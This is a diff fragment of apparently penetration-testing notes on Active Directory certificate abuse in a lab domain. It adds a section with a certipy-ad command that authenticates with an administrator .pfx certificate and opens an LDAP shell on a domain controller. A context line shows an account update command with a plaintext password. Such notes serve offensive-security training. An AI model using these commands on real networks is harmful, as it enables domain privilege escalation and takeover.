@@ -357,5 +357,16 @@ certipy-ad account update -u dev@papa.local -password 'password' -user 'matt' -u
 
 <img width="1342" height="217" alt="image" src="https://github.com/user-attachments/assets/f595af7c-d5d8-40d0-9712-bbcea6be707c" />
 
+-------------
 
+### Ldap shell with pfx
+
+--------------
+
+- Using ldap_shell
+
+```bash
+certipy-ad auth  -pfx administrator_f5c613b3-bfb9-4e4b-980a-1a80242d2ab4.pfx -ldap-shell -dc-ip 192.168.130.136
+```
+<img width="1207" height="316" alt="image" src="https://github.com/user-attachments/assets/495be99f-10e5-41ba-8bdf-ff09c95aa7ac" />
 
